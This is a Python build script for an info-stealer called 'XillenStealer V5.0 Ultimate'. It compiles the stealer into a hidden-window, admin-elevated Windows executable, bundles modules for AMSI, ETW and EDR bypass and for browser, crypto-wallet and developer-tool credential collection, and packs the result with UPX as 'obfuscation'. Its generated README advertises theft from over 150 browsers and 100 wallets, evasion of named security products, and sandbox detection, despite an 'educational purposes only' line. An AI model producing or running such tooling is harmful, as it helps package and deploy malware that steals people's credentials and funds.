import os
import subprocess
import sys
import shutil
from pathlib import Path

class XillenV5Builder:
    def __init__(self):
        self.project_root = Path.cwd()
        self.dist_dir = self.project_root / "dist"
        self.build_dir = self.project_root / "build"
        
    def check_dependencies(self):
        print("Checking build dependencies...")
        
        required_packages = [
            "pyinstaller",
            "cryptography", 
            "pyo3",
            "pillow",
            "psutil",
            "pyyaml"
        ]
        
        missing_packages = []
        for package in required_packages:
            try:
                __import__(package.replace("-", "_"))
                print(f"✓ {package}")
            except ImportError:
                missing_packages.append(package)
                print(f"✗ {package}")
        
        if missing_packages:
            print(f"Installing missing packages: {', '.join(missing_packages)}")
            subprocess.run([sys.executable, "-m", "pip", "install"] + missing_packages)
        
        return True
    
    def build_rust_engine(self):
        print("Building Rust engine...")
        
        rust_dir = self.project_root / "core" / "rust_engine"
        
        if not rust_dir.exists():
            print("Rust engine directory not found, skipping...")
            return False
        
        try:
            os.chdir(rust_dir)
            
            subprocess.run(["cargo", "build", "--release"], check=True)
            
            built_lib = rust_dir / "target" / "release" / "xillen_engine.dll"
            if built_lib.exists():
                dest_lib = rust_dir / "xillen_engine.pyd"
                shutil.copy2(built_lib, dest_lib)
                print("✓ Rust engine built successfully")
                return True
            else:
                print("✗ Rust engine build failed")
                return False
                
        except subprocess.CalledProcessError as e:
            print(f"✗ Rust build failed: {e}")
            return False
        except FileNotFoundError:
            print("✗ Cargo not found - Rust not installed")
            return False
        finally:
            os.chdir(self.project_root)
    
    def create_spec_file(self):
        spec_content = '''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['stealer_v5_ultimate.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('core', 'core'),
        ('core/rust_engine/*.pyd', 'core/rust_engine/'),
    ],
    hiddenimports=[
        'core.rust_engine.py_integration',
        'core.evasion.advanced_amsi',
        'core.evasion.advanced_etw', 
        'core.evasion.edr_bypass',
        'core.collectors.extended_browsers',
        'core.collectors.crypto_wallets',
        'core.collectors.dev_tools',
        'core.collectors.steganography',
        'core.ai_evasion',
        'core.utils.logger',
        'PIL',
        'psutil',
        'yaml',
        'cryptography'
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='XillenStealerV5Ultimate',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    uac_admin=True,
)
'''
        
        with open('XillenV5Ultimate.spec', 'w') as f:
            f.write(spec_content)
        
        print("✓ Spec file created")
        return True
    
    def build_executable(self):
        print("Building executable with PyInstaller...")
        
        try:
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole", 
                "--uac-admin",
                "--name=XillenStealerV5Ultimate",
                "--distpath=dist",
                "--workpath=build",
                "--specpath=.",
                "XillenV5Ultimate.spec"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✓ Executable built successfully")
                return True
            else:
                print(f"✗ PyInstaller failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"✗ Build failed: {e}")
            return False
    
    def create_test_versions(self):
        print("Creating test versions...")
        
        test_commands = [
            ("XillenStealerV5_TestMode.exe", ["--test"]),
            ("XillenStealerV5_DryRun.exe", ["--dry-run"]),
            ("XillenStealerV5_LogOnly.exe", ["--logging-only"])
        ]
        
        original_exe = self.dist_dir / "XillenStealerV5Ultimate.exe"
        
        if not original_exe.exists():
            print("✗ Original executable not found")
            return False
        
        for test_name, args in test_commands:
            test_exe = self.dist_dir / test_name
            shutil.copy2(original_exe, test_exe)
            
            wrapper_script = f'''
import subprocess
import sys
import os

exe_path = os.path.join(os.path.dirname(__file__), "XillenStealerV5Ultimate.exe")
args = {args} + sys.argv[1:]
subprocess.run([exe_path] + args)
'''
            
            wrapper_py = self.dist_dir / f"{test_name.replace('.exe', '.py')}"
            with open(wrapper_py, 'w') as f:
                f.write(wrapper_script)
        
        print("✓ Test versions created")
        return True
    
    def obfuscate_executable(self):
        print("Applying obfuscation...")
        
        try:
            upx_path = shutil.which("upx")
            if upx_path:
                exe_file = self.dist_dir / "XillenStealerV5Ultimate.exe"
                if exe_file.exists():
                    subprocess.run([upx_path, "--best", str(exe_file)], 
                                 capture_output=True)
                    print("✓ UPX compression applied")
            else:
                print("! UPX not found, skipping compression")
            
            return True
            
        except Exception as e:
            print(f"! Obfuscation warning: {e}")
            return True
    
    def cleanup_build_files(self):
        print("Cleaning up build files...")
        
        cleanup_items = [
            self.build_dir,
            "XillenV5Ultimate.spec",
            "__pycache__"
        ]
        
        for item in cleanup_items:
            if isinstance(item, str):
                item = Path(item)
            
            try:
                if item.exists():
                    if item.is_dir():
                        shutil.rmtree(item)
                    else:
                        item.unlink()
            except Exception as e:
                print(f"Warning: Could not remove {item}: {e}")
        
        print("✓ Cleanup completed")
    
    def create_readme(self):
        readme_content = '''# XillenStealer V5.0 Ultimate

## Built Executables

### Main Executable
- `XillenStealerV5Ultimate.exe` - Full production version

### Safe Testing Versions
- `XillenStealerV5_TestMode.exe` - Safe test mode (recommended for testing)
- `XillenStealerV5_DryRun.exe` - Simulation mode, no files written
- `XillenStealerV5_LogOnly.exe` - Logging only mode

### Features
- 150+ Browser support (Chrome, Firefox, Edge, Opera, Brave, etc.)
- 100+ Crypto wallets (MetaMask, Trust Wallet, Exodus, etc.)
- Advanced EDR bypass (CrowdStrike, SentinelOne, Defender)
- Rust-powered cryptography engine
- AI-based ML detection evasion
- Steganography and NTFS ADS hiding
- Dev tools collection (VS Code, Docker, AWS, etc.)

### Safety Features
- Automatic VM/Sandbox detection
- Test mode for safe evaluation
- Dry-run simulation mode
- Comprehensive logging

### Usage
Run with `--test` flag for safe testing:
```
XillenStealerV5Ultimate.exe --test
```

Built with advanced evasion techniques for educational purposes only.
'''
        
        readme_path = self.dist_dir / "README.md"
        with open(readme_path, 'w') as f:
            f.write(readme_content)
        
        print("✓ README created")
    
    def build(self):
        print("=== XillenStealer V5.0 Ultimate Builder ===")
        
        if not self.check_dependencies():
            return False
        
        rust_success = self.build_rust_engine()
        if not rust_success:
            print("! Continuing without Rust engine")
        
        if not self.create_spec_file():
            return False
        
        if not self.build_executable():
            return False
        
        if not self.create_test_versions():
            return False
        
        self.obfuscate_executable()
        
        self.create_readme()
        
        self.cleanup_build_files()
        
        print("\n=== Build Completed Successfully ===")
        print(f"Output directory: {self.dist_dir}")
        
        exe_path = self.dist_dir / "XillenStealerV5Ultimate.exe"
        if exe_path.exists():
            size_mb = exe_path.stat().st_size / (1024 * 1024)
            print(f"Main executable: {exe_path.name} ({size_mb:.1f} MB)")
        
        print("\nRecommended testing command:")
        print("XillenStealerV5Ultimate.exe --test")
        
        return True

def main():
    builder = XillenV5Builder()
    success = builder.build()
    
    if success:
        print("\n🎉 XillenStealer V5.0 Ultimate built successfully!")
    else:
        print("\n❌ Build failed!")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
